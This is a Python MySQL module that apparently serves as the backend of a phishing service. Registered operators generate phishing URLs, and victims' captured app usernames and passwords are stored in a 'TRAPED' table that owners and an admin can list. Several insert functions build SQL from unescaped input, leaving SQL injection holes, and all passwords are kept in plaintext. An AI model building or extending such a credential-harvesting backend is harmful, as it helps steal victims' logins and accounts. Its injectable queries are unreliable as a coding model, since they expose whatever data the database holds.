import mysql.connector
import os
# Get database credentials from environment variables
# Connect to the database
conn = mysql.connector.connect(
    host = os.environ.get('DB_HOST'),
    user = os.environ.get('DB_USER'), 
    password = os.environ.get('DB_PASSWORD'), 
    database = os.environ.get('DB_DATABASE')
)

# Create a cursor object
cursor = conn.cursor()

cursor.execute('''CREATE TABLE IF NOT EXISTS USERS
            (UID  VARCHAR(255) PRIMARY KEY NOT NULL,
            EMAIL TEXT NOT NULL,
            PASSWORD    TEXT    NOT NULL);
            ''')

cursor.execute('''CREATE TABLE IF NOT EXISTS TRAPED
            (OWNER TEXT     NOT NULL,
            APP    TEXT NOT NULL,
            UID  TEXT NOT NULL,
            PASSWORD    TEXT    NOT NULL);
            ''')


# used while registering and checking for generated phishing url
def checkIfUserExists(uid):
    global cursor
    try:
        cursor.execute("SELECT UID FROM USERS WHERE UID=%s", (uid,))
        result = cursor.fetchall()
        if len(result) == 0:
            return False
        return True
    except mysql.connector.Error as err:
        print("An error occurred:", err)
        return False




#used while registering
def insertIntoUser(uid,email,pas):
    cursor.execute(f"INSERT INTO USERS (UID,EMAIL,PASSWORD) \
      VALUES ('{uid}','{email}','{pas}' )")
    conn.commit()
    print("user added")



#used while logginig
def checkUserCredential(uid,pas):
    global cursor
    cursor.execute("SELECT UID,PASSWORD from USERS where UID=%s",(uid,))
    user_cred = cursor.fetchall()
    for row in user_cred:
        if row[0]==uid and row[1]==pas:
            return True
        return False




#used to insert into traped data
def insertIntoTraped(owner,site,uid,pas):
    cursor.execute(f"INSERT INTO TRAPED (OWNER,APP,UID,PASSWORD) \
      VALUES ('{owner}','{site}','{uid}','{pas}' )")
    conn.commit()
    print("user traped")



#get the traped data for user
def getTrapedDataForOwner(uid):
    global cursor
    cursor.execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED where OWNER=%s",(uid,))
    detail= cursor.fetchall()
    cursor.execute("select count(*) from TRAPED where OWNER=%s",(uid,))
    n=cursor.fetchall()[-1][-1]
    return [detail,n]




#------------------------------------------------ADMIN-----------------------------------------

#for admin
def getTrapedData():
    global cursor
    cursor.execute("SELECT OWNER,APP,UID,PASSWORD from TRAPED")
    detail= cursor.fetchall()
    cursor.execute("select count(*) from TRAPED")
    n=cursor.fetchall()[-1][-1]
    return [detail,n]


 #for admin      
def getUserData():
    global cursor
    cursor.execute("SELECT UID,EMAIL,PASSWORD from USERS")
    detail= cursor.fetchall()
    cursor.execute("select count(*) from USERS")
    n=cursor.fetchall()[-1][-1]
    return [detail,n]
    

#for admin
def saveFeedback(uid,name,email,msg):
    global cursor
    cursor.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
            (UID  TEXT  NOT NULL,
            NAME TEXT NOT NULL,
            EMAIL TEXT NOT NULL,
            MSG    TEXT    NOT NULL);
            ''')
    cursor.execute(f"INSERT INTO MESSAGE (UID,NAME,EMAIL,MSG) \
      VALUES ('{uid}','{name}','{email}','{msg}' )")
    conn.commit()


#for admin
def getFeedbackData():
    global cursor
    cursor.execute('''CREATE TABLE IF NOT EXISTS MESSAGE
            (UID  TEXT  NOT NULL,
            NAME TEXT NOT NULL,
            EMAIL TEXT NOT NULL,
            MSG    TEXT    NOT NULL);
            ''')
    cursor.execute("SELECT UID,NAME,EMAIL,MSG from MESSAGE")
    detail = cursor.fetchall()
    cursor.execute("select count(*) from MESSAGE")
    n=cursor.fetchall()[-1][-1]
    return [detail,n]
